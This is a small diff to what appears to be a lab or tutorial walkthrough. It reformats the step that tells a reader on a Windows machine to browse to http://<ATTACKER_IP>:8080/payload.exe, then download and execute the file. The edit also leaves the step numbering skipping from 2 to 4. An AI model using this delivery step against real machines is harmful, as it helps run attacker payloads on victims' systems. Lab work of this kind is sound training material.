@@ -78,13 +78,13 @@ On the Windows machine:
 
 1. Open browser
 2. Visit:
+   ```
+   http://<ATTACKER_IP>:8080/payload.exe
+   ```
 
-```
-http://<ATTACKER_IP>:8080/payload.exe
-```
 
-3. Download the file
-4. Execute it
+4. Download the file
+5. Execute it
 
 ---
 
